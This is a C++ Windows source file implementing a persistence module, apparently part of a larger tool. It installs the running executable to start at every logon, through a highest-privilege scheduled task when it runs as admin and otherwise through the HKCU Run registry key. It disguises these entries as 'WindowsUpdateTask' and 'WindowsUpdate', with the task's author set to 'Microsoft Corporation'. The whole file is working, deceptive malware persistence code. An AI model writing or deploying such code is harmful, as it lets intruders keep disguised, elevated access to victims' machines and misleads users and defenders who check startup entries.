#include "persistence.h"
#include <windows.h>
#include <shlobj.h>
#include <comdef.h>
#include <taskschd.h>
#include <iostream>
#include <string>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "taskschd.lib")

namespace Persistence {

static const wchar_t* TASK_NAME = L"WindowsUpdateTask";
static const char*    RUN_VALUE  = "WindowsUpdate";
static const char*    RUN_KEY    = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

static bool CreateScheduledTask(const std::string& exePath) {
    // Convert exe path to wide string
    int wlen = MultiByteToWideChar(CP_UTF8, 0, exePath.c_str(), -1, NULL, 0);
    std::wstring wExePath(wlen - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, exePath.c_str(), -1, &wExePath[0], wlen);

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bool ownCOM = (hr == S_OK || hr == S_FALSE);

    bool success = false;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) goto cleanup;

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) goto cleanup;

    {
        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) goto cleanup;

        // Delete any existing task with the same name (ignore error)
        pRootFolder->DeleteTask(_bstr_t(TASK_NAME), 0);

        ITaskDefinition* pTaskDef = NULL;
        hr = pService->NewTask(0, &pTaskDef);
        if (FAILED(hr)) { pRootFolder->Release(); goto cleanup; }

        // Registration info
        IRegistrationInfo* pRegInfo = NULL;
        pTaskDef->get_RegistrationInfo(&pRegInfo);
        if (pRegInfo) {
            pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
            pRegInfo->Release();
        }

        // Principal: run with highest privileges
        IPrincipal* pPrincipal = NULL;
        pTaskDef->get_Principal(&pPrincipal);
        if (pPrincipal) {
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }

        // Settings
        ITaskSettings* pSettings = NULL;
        pTaskDef->get_Settings(&pSettings);
        if (pSettings) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // no time limit
            pSettings->Release();
        }

        // Trigger: at logon of any user
        ITriggerCollection* pTriggers = NULL;
        pTaskDef->get_Triggers(&pTriggers);
        if (pTriggers) {
            ITrigger* pTrigger = NULL;
            pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (pTrigger) pTrigger->Release();
            pTriggers->Release();
        }

        // Action: execute the binary
        IActionCollection* pActions = NULL;
        pTaskDef->get_Actions(&pActions);
        if (pActions) {
            IAction* pAction = NULL;
            pActions->Create(TASK_ACTION_EXEC, &pAction);
            if (pAction) {
                IExecAction* pExecAction = NULL;
                pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (pExecAction) {
                    pExecAction->put_Path(_bstr_t(wExePath.c_str()));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActions->Release();
        }

        // Register the task
        IRegisteredTask* pRegistered = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(TASK_NAME),
            pTaskDef,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),     // no user (system)
            _variant_t(),     // no password
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegistered);
        if (SUCCEEDED(hr)) {
            success = true;
            pRegistered->Release();
        }

        pTaskDef->Release();
        pRootFolder->Release();
    }

cleanup:
    if (pService) pService->Release();
    if (ownCOM)   CoUninitialize();
    return success;
}

static bool RemoveScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bool ownCOM = (hr == S_OK || hr == S_FALSE);
    bool success = false;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (SUCCEEDED(hr)) {
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (SUCCEEDED(hr)) {
            ITaskFolder* pRootFolder = NULL;
            if (SUCCEEDED(pService->GetFolder(_bstr_t(L"\\"), &pRootFolder))) {
                success = SUCCEEDED(pRootFolder->DeleteTask(_bstr_t(TASK_NAME), 0));
                pRootFolder->Release();
            }
        }
        pService->Release();
    }
    if (ownCOM) CoUninitialize();
    return success;
}

// Get the full path of the current executable
std::string GetExecutablePath() {
    char path[MAX_PATH];
    DWORD result = GetModuleFileNameA(NULL, path, MAX_PATH);
    
    if (result == 0 || result == MAX_PATH) {
        return "";
    }
    
    return std::string(path);
}

// Get just the executable name from the full path
std::string GetExecutableName() {
    std::string fullPath = GetExecutablePath();
    
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        return fullPath.substr(lastSlash + 1);
    }
    
    return fullPath;
}

// If admin: create a scheduled task at logon with highest privileges.
// If not admin: add to HKCU Run registry key.
bool AddToStartup() {
    std::string exePath = GetExecutablePath();
    if (exePath.empty()) {
        return false;
    }

    if (IsRunningAsAdmin()) {
        return CreateScheduledTask(exePath);
    }

    // Non-admin path: HKCU Run registry key
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(
        hKey,
        RUN_VALUE,
        0,
        REG_SZ,
        (const BYTE*)exePath.c_str(),
        (DWORD)(exePath.length() + 1)
    );

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// Removes both the scheduled task and the Run key (whichever exists).
bool RemoveFromStartup() {
    bool removedTask = RemoveScheduledTask();

    bool removedReg = false;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        removedReg = (RegDeleteValueA(hKey, RUN_VALUE) == ERROR_SUCCESS);
        RegCloseKey(hKey);
    }

    return removedTask || removedReg;
}

} // namespace Persistence
